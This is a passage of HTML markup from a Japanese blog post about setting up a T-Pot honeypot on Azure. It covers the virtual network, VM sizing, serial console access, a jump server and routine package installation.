    style=&quot;padding-bottom: 22.916666666666668%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAARlAAAEZQAGA43XUAAAA1UlEQVQY002Q627DIAxGef+n3I+pS5MUGu5Xf7NZiWYJYQv7cEAdxwHnHEopSDHO/bwCntrCuISf18W1n2s3Dm+f8DjfsKnOvu9dI9cGidEHVIhhFq13WB8xBoG4LiVzPuaZ5DmnmXfpsxdqrSA+9yyzQrsdKuf8RyfC7jseV0WsBGct+gfovZ/mEgLato2h9gO3N/D1/IJajUQDIUQ4Hu6tIaX0z7CgtfWsfn8RsUQI4b7MBw0lg7ORh43RvAzEWoYWMPLfitkyFCuBiKHYC1jCnht+AapFhepdxkVdAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/781f6e35708cafa7ce7d8dd38867b910/8ac56/image-24.webp 240w,
/static/781f6e35708cafa7ce7d8dd38867b910/d3be9/image-24.webp 480w,
/static/781f6e35708cafa7ce7d8dd38867b910/b0a15/image-24.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/781f6e35708cafa7ce7d8dd38867b910/8ff5a/image-24.png 240w,
/static/781f6e35708cafa7ce7d8dd38867b910/e85cb/image-24.png 480w,
/static/781f6e35708cafa7ce7d8dd38867b910/0b533/image-24.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/781f6e35708cafa7ce7d8dd38867b910/0b533/image-24.png&quot;
            alt=&quot;image-24.png&quot;
            title=&quot;image-24.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;SSHなどのVirtualNetwork単位で許可する通信についてはこれより若い優先順位に設定していくイメージです。&lt;/p&gt;
&lt;h3 id=&quot;ハニーポットマシンの仮想ネットワークの作成&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%AE%E4%BB%AE%E6%83%B3%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E3%81%AE%E4%BD%9C%E6%88%90&quot; aria-label=&quot;ハニーポットマシンの仮想ネットワークの作成 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ハニーポットマシンの仮想ネットワークの作成&lt;/h3&gt;
&lt;p&gt;Azureの仮想ネットワークはAzure内のプライベートネットワークを構成する要素です。&lt;/p&gt;
&lt;p&gt;Azure仮想ネットワークを利用することで、Azure内に他ネットワークと論理的に分離されたプライベートなネットワークを構築することができます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/virtual-network/virtual-networks-overview&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Azure Virtual Network | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.rworks.jp/cloud/azure/azure-column/azure-entry/22165/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Azureの仮想ネットワークAzure VNetとは？通信方法や料金などを解説&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今回はとりあえずガチガチに絞ったサブネット空間を作成してみました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/eb85c6083c126077ca22cb5198b3a3b9/0b533/image-20.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 70.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAARlAAAEZQAGA43XUAAABxElEQVQ4y4VT2W7bMBDU//9diyB9ax6aWpIp85Cok5Sns2uzsZygJTDgPTucXVZtmPHzt4HxA95MxNlHWOexrSukXa/Xvyjzf7WqDx4v37+hrk/w7oKmqfHj9RXW2sPBR+KvUM5Ued8Plx5bSgkrlW7bhv+1crea5xnOOZyMRd05ji2895imCSEEKq/RdR2WZVFiwcqxzCWgzHeKKkqrlBMvehheOhuj5EImgQQxRkU/9BjHURH6oMF0f4zIe/7wMKcMR2X1e4321GDfdqQlfcaaiaTIHAvK+jKtcGFAprgqbVRoA/yFzxyoLDJqPyKG+NEfcFwbeSa4Hh05boT0Ybl7Is/o+Zz9nqhPmXzK6leJVELHEhHjDT2U3tNH8W1ZZvVTULwU38RHSdwwDBxHFSJrNw8zPWBpyOGSDDko81IymlmOZU96ec1z4mTtXjbcJDpzpjKLTMUSpJCVy0VBqU8heq7PW2GnTRWdHaXPzNqDJfJkay8KOVPatq0apBAefsrI1LduRD9RJf/zECctXK05XhriqGSiWEhKAm/qZx0//iYSZjSXCHcxaPmP27bR5DT8Ib9M0GDx7mkxX1C8Ll4WD/8AIqpB4cjNp3AAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/eb85c6083c126077ca22cb5198b3a3b9/8ac56/image-20.webp 240w,
/static/eb85c6083c126077ca22cb5198b3a3b9/d3be9/image-20.webp 480w,
/static/eb85c6083c126077ca22cb5198b3a3b9/b0a15/image-20.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/eb85c6083c126077ca22cb5198b3a3b9/8ff5a/image-20.png 240w,
/static/eb85c6083c126077ca22cb5198b3a3b9/e85cb/image-20.png 480w,
/static/eb85c6083c126077ca22cb5198b3a3b9/0b533/image-20.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/eb85c6083c126077ca22cb5198b3a3b9/0b533/image-20.png&quot;
            alt=&quot;image-20.png&quot;
            title=&quot;image-20.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;この段階では、ファイアウォールなどの設定は一旦無効化しています。&lt;/p&gt;
&lt;h3 id=&quot;仮想マシンの作成&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BB%AE%E6%83%B3%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%AE%E4%BD%9C%E6%88%90&quot; aria-label=&quot;仮想マシンの作成 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;仮想マシンの作成&lt;/h3&gt;
&lt;p&gt;続いて、以下の構成でAzureの仮想マシンを作成していきます。&lt;/p&gt;
&lt;h3 id=&quot;ハニーポットマシン&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E3%83%9E%E3%82%B7%E3%83%B3&quot; aria-label=&quot;ハニーポットマシン permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ハニーポットマシン&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;OS: Ubuntu20.04&lt;/li&gt;
&lt;li&gt;インフラストラクチャ冗長：なし&lt;/li&gt;
&lt;li&gt;セキュリティの種類：Standard&lt;/li&gt;
&lt;li&gt;削除の種類：容量のみ&lt;/li&gt;
&lt;li&gt;削除ポリシー：停止/割り当て解除&lt;/li&gt;
&lt;li&gt;マシンサイズ：Standard&lt;em&gt;D2s&lt;/em&gt;v3(2vCPU 8GB RAM)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;また、ネットワークについては、事前に作成しておいたセキュリティグループと仮想ネットワークを使用します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/637348a6273b784de375fd7a9a66a503/0b533/image-21-164640097030027.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 89.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAARlAAAEZQAGA43XUAAAB+klEQVQ4y5VU7XKbMBDk/d+vf5KaYDvlw4CQDQaBBJtbxXIZGsepZnbOYLS3d7dS9JK8Y59VKFWD3SFFWmoYO2NZlofgCnG7ovj3K05Fjqoq8RbvoFWN79Z3iYhou8HNM6ZpumO+PQ/D4OOzFWmtcb1e0QvyqkFaaWh9FsUVmkah73ucz2cUReHfjeMIay2skDOGRCF5VNc18jzD8XhElmW+9P1+jziOPUme5/6/NE1xOByQJG/I5F1cXJDWLXTT4HK5oOs6nyBSSoEgMeNdgcA55yPfBQUE2yJzg/tiLlFZlp6MkZlYHuMgpV47UaAbX2rbtpvpLnz4dyidbGIP2ZO1FcxkkYidalFtjPFqQ6+oeI0wNF8ymz7KBpay9tkwWhyKBkoGpEU1FRJh49oJ1n4mcU4ImT0QrksarROTK7z8Udhlyjf9IeEUCB0ifkCVW+cbUfh6zFGUtE9zU2IflmzMrWQqJGEgZmQm9jBvxArye5nnpyfkPpSvspGAhKn4ku34nxVtM/heShzsIgNpMQnhMst7Nz8Fv/MlE6HhNLcZejghTPYVTrlCKfZRpwbjVXooGDeYejmCrZHk0kN6kE3nFP2ZZg8ng6Tq8aswwcI/L5nnl2eWl8OnWjl604jTxaC+ur9WWvCzofC2obrt1VR0Du96+tEduMYHocd9D4XhBksAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/637348a6273b784de375fd7a9a66a503/8ac56/image-21-164640097030027.webp 240w,
/static/637348a6273b784de375fd7a9a66a503/d3be9/image-21-164640097030027.webp 480w,
/static/637348a6273b784de375fd7a9a66a503/b0a15/image-21-164640097030027.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/637348a6273b784de375fd7a9a66a503/8ff5a/image-21-164640097030027.png 240w,
/static/637348a6273b784de375fd7a9a66a503/e85cb/image-21-164640097030027.png 480w,
/static/637348a6273b784de375fd7a9a66a503/0b533/image-21-164640097030027.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/637348a6273b784de375fd7a9a66a503/0b533/image-21-164640097030027.png&quot;
            alt=&quot;image-21.png&quot;
            title=&quot;image-21.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;また、もし何らかの原因でSSH接続ができなくなった時のためにシリアルコンソールで操作できるようにしておくとよさそうです。&lt;/p&gt;
&lt;p&gt;シリアルコンソールを有効にするためにブート診断を有効化します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 497px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/9415485878d364de711d9802a795860a/15d25/image-29.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 22.916666666666668%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoUlEQVQY042Q0Q6DIAxF/f9P3Is+MARmDEFchlruaMmcM9myJpe2CRxu20zTBI6cs+gY5/6faIwxIKL98TvLKTk8COu6Fa1YlgXbVutXn1ISxRgrcBgGgX4CaybKuNgZ1t3gnC1yGMcRWmsY06NtW3RdB9PXuvk23g4sbu4x4KoUrLWYiwteE0O99/IBix3KyMfdnevqkBAKQBUgA34F330CHZyG31gDDmYAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/9415485878d364de711d9802a795860a/8ac56/image-29.webp 240w,
/static/9415485878d364de711d9802a795860a/d3be9/image-29.webp 480w,
/static/9415485878d364de711d9802a795860a/a4aa0/image-29.webp 497w&quot;
              sizes=&quot;(max-width: 497px) 100vw, 497px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/9415485878d364de711d9802a795860a/8ff5a/image-29.png 240w,
/static/9415485878d364de711d9802a795860a/e85cb/image-29.png 480w,
/static/9415485878d364de711d9802a795860a/15d25/image-29.png 497w&quot;
            sizes=&quot;(max-width: 497px) 100vw, 497px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/9415485878d364de711d9802a795860a/15d25/image-29.png&quot;
            alt=&quot;image-29.png&quot;
            title=&quot;image-29.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;※ もしマネージドストレージアカウントの互換性がない場合は、カスタムストレージアカウントを作成します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 661px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4f1fac449ca3d6f114a354dca0d6d712/0012b/image-30.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 57.91666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABN0lEQVQoz62S3YqDMBCFQ9k+TK9LH6K9aaGw7LKF/aFv4bMq1GWtWutvNNEYzyahSi9a2OIOfIzg5GRmToifcSSUI0op/KRCkDJ4cYkwY/DTCqdc/aMCJRcqN8iZQNdJRXcT8v3jwLEd2LaNMAyRpimiKML5fEamvos8g6o06AN9SClvQoLgiDiOIYRA27YQTXO5TaKRQN0ClEuFAOccjDGT7wXJshyUFqiqyhRrtKBlWXh+ecXnfo/dxxfedu/YbrdYLpdYrVbYbDZYr9cmX0OSJFGCdLihH2s2m4EQ8jju4QDXdVHX9bAHHYvFwhQ8TaeYTCZ/hnieh6IoUJal2WHf4Xw+N4Km6JEOT8pRpvZ37d4oQe2YvHSmGS3Ym6LF9MiaUYK+f1Qjs8Hh0R0GQYBGPeb/EvwFYd1NdBfrM9AAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/4f1fac449ca3d6f114a354dca0d6d712/8ac56/image-30.webp 240w,
/static/4f1fac449ca3d6f114a354dca0d6d712/d3be9/image-30.webp 480w,
/static/4f1fac449ca3d6f114a354dca0d6d712/84ccf/image-30.webp 661w&quot;
              sizes=&quot;(max-width: 661px) 100vw, 661px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/4f1fac449ca3d6f114a354dca0d6d712/8ff5a/image-30.png 240w,
/static/4f1fac449ca3d6f114a354dca0d6d712/e85cb/image-30.png 480w,
/static/4f1fac449ca3d6f114a354dca0d6d712/0012b/image-30.png 661w&quot;
            sizes=&quot;(max-width: 661px) 100vw, 661px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/4f1fac449ca3d6f114a354dca0d6d712/0012b/image-30.png&quot;
            alt=&quot;image-30.png&quot;
            title=&quot;image-30.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;踏み台サーバ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%B8%8F%E3%81%BF%E5%8F%B0%E3%82%B5%E3%83%BC%E3%83%90&quot; aria-label=&quot;踏み台サーバ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;踏み台サーバ&lt;/h3&gt;
&lt;p&gt;今回はハニーポットマシンに自分の環境から直接接続できないようにしたいです。&lt;/p&gt;
&lt;p&gt;そのため、踏み台サーバも同じネットワーク上に作成します。&lt;/p&gt;
&lt;p&gt;今回、踏み台サーバはUbuntuで作成しました。&lt;/p&gt;
&lt;p&gt;踏み台サーバについては常時稼働を想定しているので、(主にコストの理由から)Standard_B1s(1vCPU 1GB RAM)のサイズを選択しました。(GUI使うにはちょっときついかもですが)&lt;/p&gt;
&lt;p&gt;Standard_B1sは大体月に1000円くらいです。&lt;/p&gt;
&lt;p&gt;踏み台用途なのでディスクは作成せず、先ほど作成した踏み台用のセキュリティグループを割り当てます。&lt;/p&gt;
&lt;p&gt;ハニーポットに使用するStandard&lt;em&gt;D2s&lt;/em&gt;v3は月に1万円くらいなので結構差が大きいですね。&lt;/p&gt;
&lt;p&gt;T-PotのWebコンソールに踏み台からアクセスしたいので、GUIをインストールした上でホストマシンからRDP接続します。&lt;/p&gt;
&lt;p&gt;とりあえず必要なパッケージをインストールします。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; ubuntu-desktop xrdp -y&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;RDPの設定方法については下リンクなどを参考にしました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://gihyo.jp/admin/serial/01/ubuntu-recipe/0621&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;第621回　Ubuntu 20.04 LTSでxrdpを使用する：Ubuntu Weekly Recipe｜gihyo.jp … 技術評論社&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;セキュリティグループでホストマシンからのRDPを許可するのも忘れずに。&lt;/p&gt;
&lt;p&gt;踏み台へのSSHやRDPは、インターネットにオープンにすると攻撃されるので、自分のIPアドレスなどで固定するのがよさそうです。&lt;/p&gt;
&lt;h3 id=&quot;踏み台サーバのサイズについて追記&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%B8%8F%E3%81%BF%E5%8F%B0%E3%82%B5%E3%83%BC%E3%83%90%E3%81%AE%E3%82%B5%E3%82%A4%E3%82%BA%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E8%BF%BD%E8%A8%98&quot; aria-label=&quot;踏み台サーバのサイズについて追記 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;踏み台サーバのサイズについて(追記)&lt;/h3&gt;
&lt;p&gt;Standard_B1sでGUI使おうと思っていたのですが、やはり恐ろしく遅延して使い物にならないので断念しました。&lt;/p&gt;
&lt;p&gt;踏み台サーバはCUIのみとして、T-Potのコンソールには踏み台サーバをSSHダイナミックフォワーディングでプロキシとしてホストマシンから接続することにします。&lt;/p&gt;
&lt;p&gt;設定方法は後述します。&lt;/p&gt;
&lt;h3 id=&quot;環境のセットアップ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E7%92%B0%E5%A2%83%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97&quot; aria-label=&quot;環境のセットアップ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;環境のセットアップ&lt;/h3&gt;
&lt;p&gt;さて、マシンにSSH接続ができたら、ハニーポットと踏み台サーバのパッケージをとりあえずアップグレードしておきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; update &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt&lt;/span&gt; upgrade -y&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;次に、&lt;a href=&quot;https://www.trendmicro.com/ja_jp/business/products/hybrid-cloud/cloud-one-workload-security.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Trend Micro Cloud One Workload Security&lt;/a&gt;のAgentをインストールして適当にポリシーをセットアップしていきます。&lt;/p&gt;
&lt;p&gt;(まじで5台永久無料ライセンスがなくなったのが辛い。。)&lt;/p&gt;
&lt;p&gt;ざっくりですがポリシーこんな感じにしてます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 719px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/0eec95449ec99e0b992f29f6a0026f93/073e9/image-22.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
